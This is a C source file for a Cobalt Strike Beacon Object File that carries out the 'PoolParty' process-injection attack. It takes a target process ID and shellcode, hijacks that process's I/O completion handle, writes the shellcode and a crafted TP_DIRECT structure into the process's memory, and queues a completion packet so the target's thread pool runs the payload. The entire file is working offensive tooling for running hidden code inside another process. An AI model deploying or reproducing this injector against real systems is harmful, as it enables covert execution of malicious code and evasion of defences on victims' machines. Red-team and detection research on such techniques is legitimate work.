#include <windows.h>
#include "PoolPartyBof.h"

HANDLE m_p_hIoCompletion = NULL;

HANDLE HijackIoCompletionProcessHandle(HANDLE p_hTarget) {
    return HijackProcessHandle((PWSTR)L"IoCompletion\0", p_hTarget, IO_COMPLETION_ALL_ACCESS);
}

HANDLE GetTargetThreadPoolIoCompletionHandle() {
    HANDLE p_hIoCompletion = HijackIoCompletionProcessHandle(m_p_hTargetPid);
    BeaconPrintf(CALLBACK_OUTPUT, "[INFO]   Hijacked I/O completion handle from the target process: %x", p_hIoCompletion);
    return p_hIoCompletion;
}

void RemoteTpDirectInsertionSetupExecution() {
	_ZwSetIoCompletion ZwSetIoCompletion = (_ZwSetIoCompletion)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSetIoCompletion"));
	TP_DIRECT Direct = { 0 };
	Direct.Callback = m_ShellcodeAddress;
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Crafted TP_DIRECT structure associated with the shellcode");

	PTP_DIRECT RemoteDirectAddress = (PTP_DIRECT)(KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Allocated TP_DIRECT memory in the target process: %p", RemoteDirectAddress);
	KERNEL32$WriteProcessMemory(m_p_hTargetPid, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Written the TP_DIRECT structure to the target process");

	ZwSetIoCompletion(m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Queued a packet to the IO completion port of the target process worker factory");
}

void HijackHandles() {
	m_p_hIoCompletion = GetTargetThreadPoolIoCompletionHandle();
}

void Inject() {
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Starting PoolParty attack against process id: %d", m_dwTargetPid);
	m_p_hTargetPid = GetTargetProcessHandle();
	HijackHandles();
	m_ShellcodeAddress = AllocateShellcodeMemory();
	WriteShellcode();
	RemoteTpDirectInsertionSetupExecution();
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	PoolParty attack completed.");
}

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    m_dwTargetPid = BeaconDataInt(&parser);
    m_szShellcodeSize = BeaconDataLength(&parser);
    m_cShellcode = BeaconDataExtract(&parser, NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Shellcode Size: %d bytes", m_szShellcodeSize);
	Inject();
}